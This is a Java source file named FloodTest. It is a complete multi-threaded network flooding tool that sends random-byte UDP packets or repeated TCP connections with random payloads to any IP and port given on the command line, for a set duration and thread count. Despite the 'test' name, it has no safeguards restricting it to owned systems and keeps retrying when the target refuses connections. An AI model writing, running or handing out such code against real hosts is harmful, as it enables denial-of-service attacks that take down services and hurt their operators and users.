import java.net.*;
import java.io.*;
import java.util.Random;

public class FloodTest {

    public static void main(String[] args) {
        if (args.length != 6) {
            System.out.println("Usage: java FloodTest <IP> <Port> <Mode> <PacketSize> <DurationSeconds> <Threads>");
            System.out.println("Mode: UDP or TCP");
            return;
        }

        String targetIp = args[0];
        int port = Integer.parseInt(args[1]);
        String mode = args[2].toUpperCase();
        int packetSize = Integer.parseInt(args[3]);
        int duration = Integer.parseInt(args[4]);
        int threads = Integer.parseInt(args[5]);

        System.out.printf("Starting %s flood to %s:%d for %d seconds using %d threads...\n", mode, targetIp, port, duration, threads);

        for (int i = 0; i < threads; i++) {
            new Thread(() -> {
                try {
                    byte[] buffer = new byte[packetSize];
                    Random random = new Random();
                    long endTime = System.currentTimeMillis() + duration * 1000;

                    if (mode.equals("UDP")) {
                        DatagramSocket udpSocket = new DatagramSocket();
                        InetAddress address = InetAddress.getByName(targetIp);
                        while (System.currentTimeMillis() < endTime) {
                            random.nextBytes(buffer);
                            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, port);
                            udpSocket.send(packet);
                        }
                        udpSocket.close();
                    } else if (mode.equals("TCP")) {
                        InetAddress address = InetAddress.getByName(targetIp);
                        while (System.currentTimeMillis() < endTime) {
                            try (Socket socket = new Socket(address, port)) {
                                OutputStream out = socket.getOutputStream();
                                random.nextBytes(buffer);
                                out.write(buffer);
                                out.flush();
                            } catch (IOException e) {
                                // Connection failed (server refused or full), just retry
                            }
                        }
                    } else {
                        System.out.println("Invalid mode specified: " + mode);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }).start();
        }
    }
}